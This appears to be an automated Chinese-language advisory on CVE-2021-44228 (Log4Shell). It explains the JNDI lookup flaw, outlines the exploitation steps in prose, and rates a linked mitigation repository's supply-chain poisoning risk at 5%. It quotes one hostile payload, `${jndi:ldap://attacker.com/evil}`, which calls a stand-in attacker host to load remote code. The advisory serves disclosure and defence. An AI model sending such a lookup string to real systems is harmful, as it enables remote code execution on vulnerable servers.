## CVE-2021-44228-Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，且允许Log消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j 2 中的一个严重漏洞，它允许攻击者通过控制日志消息或日志消息参数来执行任意代码。漏洞原理是 Log4j 2 启用了 JNDI 功能，该功能允许从 LDAP 服务器等远程位置加载代码。攻击者可以构造包含 JNDI 查找的恶意日志消息，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j 2 记录此消息时，它会尝试从 attacker.com 加载并执行代码。

**利用方式：**

1.  攻击者向使用 Log4j2 的应用程序发送包含恶意 JNDI 查找的请求。这些请求可以通过多种方式发送，例如 HTTP 请求头、POST 请求参数、WebSocket 消息等，只要这些数据会被Log4j记录即可。
2.  应用程序使用 Log4j2 记录接收到的请求，包括恶意 JNDI 查找字符串。
3.  Log4j2 解析日志消息，识别 JNDI 查找字符串，并尝试通过 JNDI 连接到指定的 LDAP 服务器（`attacker.com`）。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行恶意 Java 类，从而允许攻击者在服务器上执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的POC是有效的，并且已经在野外被广泛利用。

**投毒风险：**

提供的漏洞利用代码是一个缓解脚本，旨在移除 Log4j JAR 文件中易受攻击的 `JndiLookup` 类。虽然该脚本本身旨在缓解漏洞，但仍然存在一些投毒风险：

*   **依赖项：**  该脚本依赖于 `PyYAML` 和系统命令 `zip` 和 `zipinfo`。如果这些依赖项被篡改或存在漏洞，可能会导致脚本执行恶意代码。
*   **配置：**  该脚本使用 `config.yaml` 文件进行配置。如果攻击者可以修改此配置文件，他们可能会将脚本指向恶意位置或执行其他恶意操作。
*   **脚本逻辑：** 脚本尝试从指定目录查找并修改JAR文件。 存在一定风险，即如果脚本逻辑存在缺陷，脚本可能会意外删除或损坏重要的JAR文件，导致服务中断，但造成远程代码执行的可能性较小。 投毒风险预估为5%。

**项目地址:** [axisops/CVE-2021-44228](https://github.com/axisops/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)